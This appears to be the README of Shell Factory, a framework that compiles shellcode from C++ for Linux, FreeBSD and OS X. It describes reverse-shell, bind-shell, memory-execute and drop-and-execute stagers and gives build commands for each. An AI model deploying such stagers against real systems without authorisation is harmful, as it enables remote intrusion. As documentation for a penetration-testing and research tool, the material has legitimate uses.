# Shell Factory

**Shell Factory** is a framework for compiling shellcodes from a C++ source for
multiple systems and architectures.

It is composed of multiple parts:

- a Rakefile for compiling and linking against different compilers and architectures.
- the factory, a set of C++ headers to generate system calls for different systems and architectures.
- picolib, a generic C++ library relying on the system call factory to abstract interactions the target system.

The shellcode is compiled as a single compilation unit with common optimizations to reduce its code size.

The resulting file is supposed to be a single binary blob executable from anywhere in memory, starting at offset 0.

## Requirements

- Rake

### Linux

- `binutils`
- `g++` or `clang++`

### OS X

- `Xcode` command-line tools

## Basic usage

Put your shellcode source file in the `shellcodes` directory, then compile it with `rake <shellcode>`.

For example, create a template file named `shellcodes/template.cc` :

```c++
#include <factory.h>
#include <pico.h>

using namespace Pico;

SHELLCODE_ENTRY {
    Process::exit(0);
}
```

Then compile it with: `rake template`. On a Linux amd64 system, this will generate the files `bins/template.elf` and `bins/template.x86_64-linux.bin`.

```raw
$ objdump -d bins/template.elf

00000000004000b0 <_start>:
  4000b0:       31 ff                   xor    %edi,%edi
  4000b2:       b8 e7 00 00 00          mov    $0xe7,%eax
  4000b7:       0f 05                   syscall
```

## Default shellcodes

Three generic stager shellcodes are provided in the `shellcodes` directory:

- `shellexec` : runs a standard `/bin/sh` shell or any specified command.

- `memexec` : allocates executable memory, receives data and executes it.

- `dropexec` : reads data, drops an executable file on the system and executes it.

## Channels

Channels are an abstraction layer that allows to use different kind of data
streams configurable through compilation variables: files, sockets, opened file
descriptors.

They are typically used by `shellexec`, `memexec` and `dropexec` to receive and
send data. The default channels used are the standard input/output when none are
specified.

### Examples

#### Reverse shell on the local network

```sh
rake shellexec CHANNEL=TCP_CONNECT HOST=192.168.0.2 PORT=2222
```

#### Bind-shell TCPv6

```sh
rake shellexec CHANNEL=TCP6_LISTEN HOST=::1 PORT=1111
```

#### Reverse memory execute over SCTPv6

```sh
rake memexec CHANNEL=SCTP6_CONNECT HOST=fe80::800:27ff:fe00:0 PORT=3333
```

## Advanced usage

### Switching compilers

Using the `CC` variable to select your compiler.

```sh
rake shellexec CC=clang++
```

### Cross-compilation

You will require a cross-compiler and the headers of the system you are targeting.

```sh
rake memexec CHANNEL=TCP_LISTEN HOST=0.0.0.0 PORT=1337 TRIPLE=aarch64-linux-gnu
```

Use the variable `SYSROOT` to specify the root of the target filesystem.

### Debugging

The code is by default massively inlined which makes it particularly tedious to
debug. If you encounter a problem, try decreasing the inline level through the
`RELAX_INLINE` parameter.

Also, try specifying `OUTPUT_DEBUG=1` which will generate an executable file with symbols.

### Producing smaller code

Some parameters can be used to reduce the code size in some circumstances:

- `NO_ASSERTS=1` : removes any assert checks from the final shellcode

- `NO_ERROR_CHECKS=1` : removes error checks at system call returns

Do not use format functions (`printf`, `sprintf`, `String::sprintf`, and so
on.) as they will increase your code size significantly.

Avoid using the C++ `new` operator as it will instanciate a custom heap which
constitutes a relatively large piece of code.

## Supported targets

|          | x86 | amd64 | ARM | Aarch64 | PowerPC | SH4 | MIPS |
|----------|-----|-------|-----|---------|---------|-----|------|
| Linux    | ✓   | ✓     | ✓   | ✓       | ✓       | ✓   | ∼    |
| FreeBSD  |     | ✓     | ∼   |         |         |     |      |
| OS X     |     | ∼     |     |         |         |     |      |

Items marked as ∼ are a work in progress and are not fully implemented yet.

## Caveats

- Passing system call arguments by stack if not yet fully supported.

- No Windows support yet.

- Resulting shellcodes will not enforce any specific charset and may contain null bytes. You will need to use a shellcode encoder for that purpose.

## Authors

- Guillaume Delugré
